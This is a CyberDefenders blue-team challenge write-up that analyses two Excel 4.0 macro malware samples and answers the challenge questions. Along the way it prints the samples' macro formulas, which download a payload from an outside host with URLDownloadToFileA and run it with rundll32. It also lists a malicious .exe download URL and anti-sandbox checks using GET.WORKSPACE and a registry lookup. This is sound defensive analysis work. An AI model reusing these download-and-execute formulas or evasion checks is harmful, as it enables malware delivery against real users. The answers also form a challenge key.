---
title: XLM Macros Writeup - CyberDefenders
description: Recently, we have seen a resurgence of Excel-based malicous office
  documents. Howerver, instead of using VBA-style macros, they are using older
  style Excel 4 macros. This changes our approach to analyzing these documents,
  requiring a slightly different set of tools. In this challenge, you, as a
  security blue team analyst will get hands-on with two documents that use Excel
  4.0 macros to perform anti-analysis and download the next stage of the attack.
author: Naimul Islam
date: 2023-08-04
tags:
  - post
  - featured
image: https://cyberdefenders.org/media/terraform/XLM%20Macros/XLM_Macros.jpg
imageAlt: XLM
---

> Recently, we have seen a resurgence of Excel-based malicous office documents. Howerver, instead of using VBA-style macros, they are using older style Excel 4 macros. This changes our approach to analyzing these documents, requiring a slightly different set of tools. In this challenge, you'll get hands-on with two documents that use Excel 4.0 macros to perform anti-analysis and download the next stage of the attack.

# Sample 1

## 1. What is the document decryption password?

First check if the file is encrypted.

```
root@06c2f2076f07 /shared# msoffcrypto-tool -t -v sample1.bin  
Version: 5.0.1
sample1.bin: encrypted
```

Yes. Now get the pass.

```
root@1ae0377cd588 /shared# msoffcrypto-crack.py sample1.bin  
Password found: VelvetSweatshop
```

## 2. This document contains six hidden sheets. What are their names? Provide the value of the one starting with S.

After getting the password, I decrypted the file.

```
msoffcrypto-tool -p VelvetSweatshop sample1.bin dec-sample1.bin
```

Got sheet information by using oledump with plugin_biff.

```
root@06c2f2076f07 /shared# oledump.py -p ~/DidierStevensSuite/plugin_biff.py --pluginoptions "-x" dec-sample1.bin  
 1:       114 '\x01CompObj'
 2:       368 '\x05DocumentSummaryInformation'
 3:       200 '\x05SummaryInformation'
 4:     92329 'Workbook'
              Plugin: BIFF plugin  
                0085     25 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden - SOCWNEScLLxkLhtJp
                0085     25 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden - OHqYbvYcqmWjJJjsF
                0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden - Macro2
                0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden - Macro3
                0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden - Macro4
                0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden - Macro5
                0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet1
                0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet2
                0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet3
[...]
```

## 3. What URL is the malware using to download the next stage? Only include the second-level and top-level domain. For example, xyz.com.

```
root@1ae0377cd588 /shared# strings dec-sample1.bin | re-search.py -n url
http://rilaer.com/IfAmGZIJjbwzvKNTxSPM/ixcxmzcvqi.exe~
http://rilaer.com/IfAmGZIJjbw
http://rilaer.com/IfAmGZIJjbwzvKNTxSPM/ixcxmzcvqi.exe
```

## 4. What malware family was this document attempting to drop?

Found the sample on malwarebazar

![](https://imgur.com/ZlqOmcd)

# Sample 2

## 5. This document has a very hidden sheet. What is the name of this sheet?

First, checking if the file is encrypted:

```
root@06c2f2076f07 /shared# msoffcrypto-tool -t -v sample2.bin
Version: 5.0.1
sample2.bin: not encrypted
```

Using oledump with plugin_biff plugin:

```
oledump.py sample2.bin -p ~/DidierStevensSuite/plugin_biff.py --pluginoptions "-x"
```

```
[...]
0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet1
0085     18 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, very hidden - CSHykdYHvi
[...]
```

## 6. This document uses reg.exe. What registry key is it checking?

```
[...]
'0207    131 STRING : String Value of a Formula - b\'"VBAWarnings"=dword:00000002\''
[...]
```

## 7.  From the use of reg.exe, what value of the assessed key indicates a sandbox environment?

0x1

## 8. This document performs several additional anti-analysis checks. What Excel 4 macro function does it use?

![](https://imgur.com/undefined)

(part of olevba output)

All these checks are used by the malware to see if its running in a sand boxed environment. Using this [reference](https://malware.news/t/excel-4-macros-get-workspace-reference/38892), This is what the highlighted keys check:

**GET.WORKSPACE(2):** Version of Excel Running
**GET.WORKSPACE(13):** Workspace Width
**GET.WORKSPACE(14):** Workspace Height
**GET.WORKSPACE(19):** If a mouse is present
**GET.WORKSPACE(42):** If Machine can play Sound

## 9. This document checks for the name of the environment in which Excel is running. What value is it using to compare?

Windows

```
FORMULA("=SHARED FMLA at rowx=0 colx=1IF(ISNUMBER(SEARCH(""Windows"",GET.WORKSPACE(1))), ,CLOSE(TRUE))",K7)
```

## 10. What type of payload is downloaded?

DLL

```
FORMULA("=CALL(""Shell32"",""ShellExecuteA"",""JJCCCJJ"",0,""open"",""C:\Windows\system32\rundll32.exe"",""c:\Users\Public\bmjn5ef.html,DllRegisterServer"",0,5)",K11)
```

## 11. What URL does the malware download the payload from?

https[://]ethelenecrace[.]xyz/fbb3

```
FORMULA("=CALL(""urlmon"",""URLDownloadToFileA"",""JJCCJJ"",0,""https://ethelenecrace.xyz/fbb3"",""c:\Users\Public\bmjn5ef.html"",0,0)",K8)
```

## 12. What is the filename that the payload is saved as?

bmjn5ef.html

## 13. How is the payload executed? For example, mshta.exe

rundll32.exe

```
FORMULA("=CALL(""Shell32"",""ShellExecuteA"",""JJCCCJJ"",0,""open"",""C:\Windows\system32\rundll32.exe"",""c:\Users\Public\bmjn5ef.html,DllRegisterServer"",0,5)",K11)
```

## 14. What was the malware family?

After submitting the md5 on VT, got zloader.
